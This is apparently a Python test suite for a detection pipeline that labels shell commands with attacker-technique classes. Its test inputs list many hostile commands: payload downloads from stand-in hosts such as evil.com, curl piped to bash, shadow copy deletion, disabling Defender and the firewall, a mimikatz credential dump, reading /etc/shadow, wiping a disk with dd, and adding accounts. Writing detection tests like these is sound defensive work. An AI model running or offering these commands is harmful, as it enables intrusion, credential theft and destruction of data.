"""
validate_rule_engine.py — End-to-end tests for the Genos hybrid pipeline:
  deobfuscation → parser → semantic features → rule engine

Each test case may specify:
    command           : raw command string
    require_class     : candidate_classes must contain ALL of these
    forbid_class      : candidate_classes must NOT contain ANY of these
    require_evidence  : at least one evidence string must contain each needle
    require_prior_gt  : {class_label: threshold} — prior must be >= threshold
    require_parser    : {field: [values]} parser field must contain each value
    forbid_parser     : {field: [values]} parser field must not contain any value
    require_semantic  : [feature_names] each must be True
    forbid_semantic   : [feature_names] each must be False/falsy
"""

import sys
import os

# run from parser/ directory
sys.path.insert(0, os.path.dirname(__file__))

from parser import parse_command
from semantic_features import build_semantic_features
from rule_engine import (
    build_rule_result,
    CLS_REGISTRY_RUN_KEY,
    CLS_SCHEDULED_TASK,
    CLS_INGRESS_TOOL_TRANSFER,
    CLS_ARCHIVE_COLLECTED_DATA,
    CLS_OBFUSCATED_FILES,
    CLS_CMD_SCRIPTING,
    CLS_WMI_EXEC,
    CLS_INHIBIT_SYSTEM_RECOVERY,
    CLS_CREATE_MODIFY_SERVICE,
    CLS_SIGNED_BINARY_PROXY,
    CLS_REMOTE_SERVICES,
    CLS_DEOBFUSCATE_DECODE,
    CLS_ACCOUNT_DISCOVERY,
    CLS_MODIFY_REGISTRY,
    CLS_IMPAIR_DEFENSES,
    CLS_FILE_PERM_MOD,
    CLS_INDICATOR_REMOVAL,
    CLS_HIDE_ARTIFACTS,
    CLS_FILE_DIR_DISCOVERY,
    CLS_SYSTEM_INFO_DISCOVERY,
    CLS_PROCESS_DISCOVERY,
    CLS_CREDENTIAL_DUMPING,
    CLS_ABUSE_ELEVATION,
    CLS_DATA_DESTRUCTION,
    CLS_DATA_FROM_LOCAL,
    CLS_EVENT_TRIGGERED_EXEC,
    CLS_BOOT_LOGON_AUTOSTART,
    CLS_HIJACK_EXEC_FLOW,
    CLS_NATIVE_API,
    CLS_MASQUERADING,
    CLS_NETWORK_CONFIG_DISCOVERY,
    CLS_ACCOUNT_MGMT,
)

# ─────────────────────────────────────────────────────────────────────────────
# Test cases
# ─────────────────────────────────────────────────────────────────────────────

TESTS = [

    # ── 1. Registry persistence ───────────────────────────────────────────────
    {
        "id": "registry_autorun_exe",
        "command": r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\evil.exe /f",
        "require_class":    [CLS_REGISTRY_RUN_KEY],
        "forbid_class":     [CLS_INHIBIT_SYSTEM_RECOVERY, CLS_WMI_EXEC],
        "require_prior_gt": {CLS_REGISTRY_RUN_KEY: 0.80},
        "require_evidence": ["registry_autorun"],
        "require_semantic": ["modifies_registry_autorun"],
        "require_strength": "strong",
    },

    # ── 2. Scheduled task ─────────────────────────────────────────────────────
    {
        "id": "schtasks_create",
        "command": "schtasks /create /tn updater /tr evil.exe /sc onlogon",
        "require_class":    [CLS_SCHEDULED_TASK],
        "forbid_class":     [CLS_INHIBIT_SYSTEM_RECOVERY, CLS_REGISTRY_RUN_KEY],
        "require_prior_gt": {CLS_SCHEDULED_TASK: 0.80},
        "require_evidence": ["scheduled_task"],
        "require_semantic": ["creates_scheduled_task"],
        "require_strength": "strong",
    },

    # ── 3. Ingress tool transfer — curl -o ────────────────────────────────────
    {
        "id": "curl_download_exe",
        "command": "curl -o payload.exe http://1.2.3.4/payload.exe",
        "require_class":    [CLS_INGRESS_TOOL_TRANSFER],
        "require_prior_gt": {CLS_INGRESS_TOOL_TRANSFER: 0.70},
        "require_evidence": ["ingress_transfer"],
        "require_semantic": ["downloads_remote_resource"],
        "require_parser":   {"ips": ["1.2.3.4"]},
        "require_strength": "strong",
    },

    # ── 4. curl | bash ────────────────────────────────────────────────────────
    {
        "id": "curl_pipe_bash",
        "command": "curl http://1.2.3.4/install.sh | bash",
        "require_class":    [CLS_INGRESS_TOOL_TRANSFER, CLS_CMD_SCRIPTING],
        "require_prior_gt": {CLS_INGRESS_TOOL_TRANSFER: 0.70, CLS_CMD_SCRIPTING: 0.40},
        "require_evidence": ["ingress_transfer", "curl|bash"],
        "require_semantic": ["downloads_remote_resource", "runs_interpreter"],
    },

    # ── 5. Archive creation ───────────────────────────────────────────────────
    {
        "id": "tar_create_archive",
        "command": "tar -czf backup.tar.gz /home/user/data",
        "require_class":    [CLS_ARCHIVE_COLLECTED_DATA],
        "require_prior_gt": {CLS_ARCHIVE_COLLECTED_DATA: 0.60},
        "require_evidence": ["archive_collection"],
        "require_semantic": ["archive_create"],
    },

    # ── 6. PowerShell encoded command ─────────────────────────────────────────
    {
        "id": "powershell_encoded_download",
        "command": "powershell.exe -EncodedCommand SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ==",
        "require_class":    [CLS_OBFUSCATED_FILES, CLS_CMD_SCRIPTING, CLS_DEOBFUSCATE_DECODE],
        "require_prior_gt": {CLS_OBFUSCATED_FILES: 0.70, CLS_CMD_SCRIPTING: 0.55},
        "require_evidence": ["encoded_execution"],
        "require_semantic": ["uses_encoded_payload"],
        "require_parser":   {"domains": ["bad.com"]},
        "forbid_parser":    {"domains": ["net.webclient"]},
    },

    # ── 7. WMI process creation ───────────────────────────────────────────────
    {
        "id": "wmic_process_create",
        "command": 'wmic process call create "cmd.exe /c whoami"',
        "require_class":    [CLS_WMI_EXEC],
        "forbid_class":     [CLS_SCHEDULED_TASK, CLS_REGISTRY_RUN_KEY],
        "require_prior_gt": {CLS_WMI_EXEC: 0.75},
        "require_evidence": ["wmi_exec"],
        "require_semantic": ["remote_execution_or_session"],
        "require_strength": "strong",
    },

    # ── 8. Shadow copy deletion ───────────────────────────────────────────────
    {
        "id": "vssadmin_delete_shadows",
        "command": "vssadmin delete shadows /all /quiet",
        "require_class":    [CLS_INHIBIT_SYSTEM_RECOVERY],
        "forbid_class":     [CLS_INGRESS_TOOL_TRANSFER, CLS_REGISTRY_RUN_KEY, CLS_SCHEDULED_TASK],
        "require_prior_gt": {CLS_INHIBIT_SYSTEM_RECOVERY: 0.85},
        "require_evidence": ["shadow_deletion"],
        "require_semantic": ["deletes_shadow_copies"],
        "require_strength": "strong",
    },

    # ── 9. Service creation ───────────────────────────────────────────────────
    {
        "id": "sc_create_service",
        "command": r"sc create updater binPath= C:\Users\Public\evil.exe",
        "require_class":    [CLS_CREATE_MODIFY_SERVICE],
        "forbid_class":     [CLS_INHIBIT_SYSTEM_RECOVERY],
        "require_prior_gt": {CLS_CREATE_MODIFY_SERVICE: 0.75},
        "require_evidence": ["service_creation"],
        "require_semantic": ["creates_or_modifies_service"],
        "require_strength": "strong",
    },

    # ── Negative / benign cases — rules must stay conservative ────────────────

    {
        "id": "benign_ls",
        "command": "ls",
        "forbid_class": [
            CLS_REGISTRY_RUN_KEY, CLS_SCHEDULED_TASK, CLS_INGRESS_TOOL_TRANSFER,
            CLS_INHIBIT_SYSTEM_RECOVERY, CLS_WMI_EXEC, CLS_CREATE_MODIFY_SERVICE,
        ],
    },

    {
        "id": "benign_pwd",
        "command": "pwd",
        "forbid_class": [
            CLS_REGISTRY_RUN_KEY, CLS_SCHEDULED_TASK, CLS_INGRESS_TOOL_TRANSFER,
            CLS_INHIBIT_SYSTEM_RECOVERY, CLS_WMI_EXEC,
        ],
        "require_strength": "none",
    },

    {
        "id": "benign_whoami",
        "command": "whoami",
        "forbid_class": [
            CLS_REGISTRY_RUN_KEY, CLS_SCHEDULED_TASK, CLS_INGRESS_TOOL_TRANSFER,
            CLS_INHIBIT_SYSTEM_RECOVERY, CLS_WMI_EXEC, CLS_CREATE_MODIFY_SERVICE,
        ],
        "require_class": [CLS_ACCOUNT_DISCOVERY],
        "require_strength": "weak",
    },

    {
        "id": "benign_systemctl_status",
        "command": "systemctl status nginx",
        "forbid_class": [
            CLS_REGISTRY_RUN_KEY, CLS_SCHEDULED_TASK, CLS_INGRESS_TOOL_TRANSFER,
            CLS_INHIBIT_SYSTEM_RECOVERY, CLS_WMI_EXEC, CLS_CREATE_MODIFY_SERVICE,
        ],
    },

    {
        "id": "benign_git_clone",
        "command": "git clone https://github.com/org/repo.git",
        "forbid_class": [
            CLS_REGISTRY_RUN_KEY, CLS_SCHEDULED_TASK, CLS_INHIBIT_SYSTEM_RECOVERY,
            CLS_WMI_EXEC, CLS_CREATE_MODIFY_SERVICE,
        ],
    },

    {
        "id": "benign_ssh",
        "command": "ssh user@192.168.1.10",
        "require_class":  [CLS_REMOTE_SERVICES],
        "forbid_class":   [CLS_INHIBIT_SYSTEM_RECOVERY, CLS_REGISTRY_RUN_KEY, CLS_SCHEDULED_TASK],
        "require_prior_gt": {CLS_REMOTE_SERVICES: 0.40},
        "require_strength": "weak",
    },

    {
        "id": "benign_tar_extract",
        "command": "tar -xzf archive.tar.gz",
        # archive_extract should NOT produce CLS_ARCHIVE_COLLECTED_DATA
        "forbid_class":   [CLS_ARCHIVE_COLLECTED_DATA, CLS_INHIBIT_SYSTEM_RECOVERY],
        "require_semantic": ["archive_extract"],
        "forbid_semantic":  ["archive_create"],
    },

    # ── Extra edge cases ──────────────────────────────────────────────────────

    {
        "id": "wmic_shadowcopy_delete",
        "command": "wmic shadowcopy delete",
        "require_class":    [CLS_INHIBIT_SYSTEM_RECOVERY],
        "require_prior_gt": {CLS_INHIBIT_SYSTEM_RECOVERY: 0.85},
        "require_evidence": ["shadow_deletion"],
    },

    {
        "id": "bitsadmin_download",
        "command": r"bitsadmin /transfer myJob /download /priority normal http://evil.com/payload.exe C:\temp\payload.exe",
        "require_class":    [CLS_INGRESS_TOOL_TRANSFER, CLS_SIGNED_BINARY_PROXY],
        "require_prior_gt": {CLS_INGRESS_TOOL_TRANSFER: 0.70},
        "require_evidence": ["ingress_transfer"],
        "require_semantic": ["downloads_remote_resource"],
    },

    {
        "id": "certutil_download",
        "command": r"certutil -urlcache -split -f http://evil.com/shell.exe C:\shell.exe",
        "require_class":    [CLS_INGRESS_TOOL_TRANSFER, CLS_SIGNED_BINARY_PROXY],
        "require_prior_gt": {CLS_INGRESS_TOOL_TRANSFER: 0.70},
        "require_evidence": ["ingress_transfer"],
        "require_semantic": ["downloads_remote_resource", "uses_signed_proxy_binary"],
    },

    # ── v1.1 Extended rule tests ──────────────────────────────────────────────

    {
        "id": "chmod_permission_mod",
        "command": "chmod 777 /tmp/payload.sh",
        "require_class": [CLS_FILE_PERM_MOD],
        "require_prior_gt": {CLS_FILE_PERM_MOD: 0.40},
    },

    {
        "id": "icacls_permission_mod",
        "command": r"icacls C:\Windows\Temp\malware.exe /grant Everyone:F",
        "require_class": [CLS_FILE_PERM_MOD],
    },

    {
        "id": "set_mppreference_disable",
        "command": "Set-MpPreference -DisableRealtimeMonitoring $true",
        "require_class": [CLS_IMPAIR_DEFENSES],
        "require_prior_gt": {CLS_IMPAIR_DEFENSES: 0.50},
    },

    {
        "id": "netsh_firewall",
        "command": "netsh advfirewall set allprofiles state off",
        "require_class": [CLS_IMPAIR_DEFENSES],
    },

    {
        "id": "touch_timestomp",
        "command": "touch -t 197001010000.00 /tmp/evil.sh",
        "require_class": [CLS_INDICATOR_REMOVAL],
        "require_evidence": ["indicator_removal"],
    },

    {
        "id": "rm_log_deletion",
        "command": "rm -f /var/log/auth.log",
        "require_class": [CLS_INDICATOR_REMOVAL],
    },

    {
        "id": "find_dir_discovery",
        "command": "find / -name '*.conf' -type f",
        "require_class": [CLS_FILE_DIR_DISCOVERY],
        "forbid_class": [CLS_ABUSE_ELEVATION],
    },

    {
        "id": "systeminfo_discovery",
        "command": "systeminfo",
        "require_class": [CLS_SYSTEM_INFO_DISCOVERY],
    },

    {
        "id": "tasklist_process_discovery",
        "command": "tasklist /v",
        "require_class": [CLS_PROCESS_DISCOVERY],
    },

    {
        "id": "mimikatz_cred_dump",
        "command": "mimikatz.exe sekurlsa::logonpasswords",
        "require_class": [CLS_CREDENTIAL_DUMPING],
        "require_prior_gt": {CLS_CREDENTIAL_DUMPING: 0.15},
    },

    {
        "id": "sudo_elevation",
        "command": "sudo /bin/bash",
        "require_class": [CLS_ABUSE_ELEVATION],
        "require_prior_gt": {CLS_ABUSE_ELEVATION: 0.35},
    },

    {
        "id": "find_suid",
        "command": "find / -perm +4000 -type f 2>/dev/null",
        "require_class": [CLS_ABUSE_ELEVATION],
        "forbid_class": [CLS_FILE_DIR_DISCOVERY],
    },

    {
        "id": "rundll32_lolbin",
        "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
        "require_class": [CLS_SIGNED_BINARY_PROXY],
    },

    {
        "id": "msiexec_lolbin",
        "command": "msiexec /q /i http://evil.com/payload.msi",
        "require_class": [CLS_SIGNED_BINARY_PROXY],
    },

    {
        "id": "atbroker_event_triggered",
        "command": "atbroker /start malware_test",
        "require_class": [CLS_EVENT_TRIGGERED_EXEC],
    },

    {
        "id": "bashrc_boot_logon",
        "command": "echo 'malware.sh' >> ~/.bashrc",
        "require_class": [CLS_BOOT_LOGON_AUTOSTART],
    },

    {
        "id": "ld_preload_hijack",
        "command": "export LD_PRELOAD=/tmp/evil.so",
        "require_class": [CLS_HIJACK_EXEC_FLOW],
    },

    {
        "id": "dd_data_destruction",
        "command": "dd if=/dev/zero of=/dev/sda bs=1M",
        "require_class": [CLS_DATA_DESTRUCTION],
    },

    {
        "id": "useradd_account_mgmt",
        "command": "useradd -m attacker",
        "require_class": [CLS_ACCOUNT_MGMT],
    },

    {
        "id": "net_user_add",
        "command": "net user hacker Password1 /add",
        "require_class": [CLS_ACCOUNT_MGMT],
    },

    {
        "id": "copy_to_system32_masquerade",
        "command": r"copy evil.exe C:\Windows\System32\svchost.exe",
        "require_class": [CLS_MASQUERADING],
    },

    {
        "id": "virtualalloc_native_api",
        "command": r'Add-Type -MemberDefinition \'[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\' -Name Win32 -Namespace Pinvoke',
        "require_class": [CLS_NATIVE_API],
    },

    {
        "id": "echo_scripting_builtin",
        "command": "echo 'test payload'",
        "require_class": [CLS_CMD_SCRIPTING],
        "require_strength": "weak",
    },

    {
        "id": "write_host_ps_cmdlet",
        "command": "Write-Host 'executing payload'",
        "require_class": [CLS_CMD_SCRIPTING],
    },

    {
        "id": "invoke_webrequest_download",
        "command": "Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\temp\\payload.exe",
        "require_class": [CLS_INGRESS_TOOL_TRANSFER],
    },

    {
        "id": "cat_local_read",
        "command": "cat /etc/shadow",
        "require_class": [CLS_DATA_FROM_LOCAL, CLS_CREDENTIAL_DUMPING],
    },

    {
        "id": "reg_add_defender_disable",
        "command": r'reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        "require_class": [CLS_MODIFY_REGISTRY, CLS_IMPAIR_DEFENSES],
    },

    {
        "id": "attrib_hide",
        "command": "attrib +h +s C:\\malware\\payload.exe",
        "require_class": [CLS_HIDE_ARTIFACTS],
    },

    {
        "id": "net_stop_defender",
        "command": "net stop WinDefend",
        "require_class": [CLS_IMPAIR_DEFENSES],
        "require_strength": "strong",
    },

    # ── Bucketing: none-bucket cases ──────────────────────────────────────────

    {
        "id": "none_date",
        "command": "date",
        "require_strength": "none",
    },

    {
        "id": "none_foobar",
        "command": "foobar --xyz",
        "require_strength": "none",
    },

    {
        "id": "none_empty_fragment",
        "command": "x",
        "require_strength": "none",
    },

    # ── Bucketing: weak-bucket cases ──────────────────────────────────────────

    {
        "id": "weak_tar_archive",
        "command": "tar -czf backup.tar.gz /home/user/data",
        "require_class": [CLS_ARCHIVE_COLLECTED_DATA],
        "require_strength": "weak",
    },

    {
        "id": "weak_find_discovery",
        "command": "find / -name '*.conf' -type f",
        "require_class": [CLS_FILE_DIR_DISCOVERY],
        "require_strength": "weak",
    },

    {
        "id": "weak_systeminfo",
        "command": "systeminfo",
        "require_class": [CLS_SYSTEM_INFO_DISCOVERY],
        "require_strength": "weak",
    },

    {
        "id": "weak_tasklist",
        "command": "tasklist /v",
        "require_class": [CLS_PROCESS_DISCOVERY],
        "require_strength": "weak",
    },

    {
        "id": "weak_ls_discovery",
        "command": "ls -la /etc",
        "require_class": [CLS_FILE_DIR_DISCOVERY],
        "require_strength": "weak",
    },

    # ── Bucketing: strong-bucket cases ────────────────────────────────────────

    {
        "id": "strong_set_mppreference",
        "command": "Set-MpPreference -DisableRealtimeMonitoring $true",
        "require_class": [CLS_IMPAIR_DEFENSES],
        "require_strength": "strong",
    },

    {
        "id": "strong_chmod",
        "command": "chmod 777 /tmp/payload.sh",
        "require_class": [CLS_FILE_PERM_MOD],
        "require_strength": "strong",
    },

    {
        "id": "strong_touch_timestomp",
        "command": "touch -t 197001010000.00 /tmp/evil.sh",
        "require_class": [CLS_INDICATOR_REMOVAL],
        "require_strength": "strong",
    },

    {
        "id": "strong_reg_broad",
        "command": r"reg add HKLM\Software\Test /v Key /t REG_SZ /d val /f",
        "require_class": [CLS_MODIFY_REGISTRY],
        "require_strength": "strong",
    },
]

# ─────────────────────────────────────────────────────────────────────────────
# Test runner
# ─────────────────────────────────────────────────────────────────────────────

def _check(test: dict) -> list:
    """Run one test, return list of failure strings (empty = pass)."""
    cmd = test["command"]
    parsed = parse_command(cmd)
    sem = build_semantic_features(parsed)
    rule = build_rule_result(parsed, sem)

    candidates = rule["candidate_classes"]
    banned = rule["banned_classes"]
    priors = rule["priors"]
    evidence = rule["evidence"]

    failures = []

    # require_class
    for cls in test.get("require_class", []):
        if cls not in candidates:
            failures.append(f"MISSING candidate_class '{cls}' (got {candidates})")

    # forbid_class
    for cls in test.get("forbid_class", []):
        if cls in candidates:
            failures.append(f"UNEXPECTED candidate_class '{cls}' must not appear")

    # require_evidence
    for needle in test.get("require_evidence", []):
        if not any(needle in ev for ev in evidence):
            failures.append(f"NO evidence containing '{needle}' (got: {evidence})")

    # require_prior_gt
    for cls, threshold in test.get("require_prior_gt", {}).items():
        actual = priors.get(cls, 0.0)
        if actual < threshold:
            failures.append(f"prior['{cls}'] = {actual:.2f} < required {threshold}")

    # require_parser
    for field, expected_values in test.get("require_parser", {}).items():
        actual = parsed.get(field, [])
        for val in expected_values:
            if val not in actual:
                failures.append(f"parser['{field}'] missing '{val}' (got {actual})")

    # forbid_parser
    for field, forbidden_values in test.get("forbid_parser", {}).items():
        actual = parsed.get(field, [])
        for val in forbidden_values:
            if val in actual:
                failures.append(f"parser['{field}'] must not contain '{val}'")

    # require_semantic
    for feat in test.get("require_semantic", []):
        if not sem.get(feat):
            failures.append(f"semantic['{feat}'] expected True (got {sem.get(feat)!r})")

    # forbid_semantic
    for feat in test.get("forbid_semantic", []):
        if sem.get(feat):
            failures.append(f"semantic['{feat}'] expected False/falsy (got {sem.get(feat)!r})")

    # require_strength
    if "require_strength" in test:
        actual_strength = rule.get("rule_strength", "none")
        if actual_strength != test["require_strength"]:
            failures.append(f"rule_strength expected '{test['require_strength']}', got '{actual_strength}'")

    return failures


def run_all() -> None:
    passed = 0
    failed = 0

    for test in TESTS:
        tid = test["id"]
        failures = _check(test)
        if failures:
            failed += 1
            print(f"FAIL  [{tid}]")
            for f in failures:
                print(f"        {f}")
        else:
            passed += 1
            print(f"PASS  [{tid}]")

    total = passed + failed
    print(f"\nResults: {passed}/{total} passed")
    if failed:
        print("FAIL  Some tests failed!")
        sys.exit(1)
    else:
        print("PASS  All tests passed!")


if __name__ == "__main__":
    run_all()
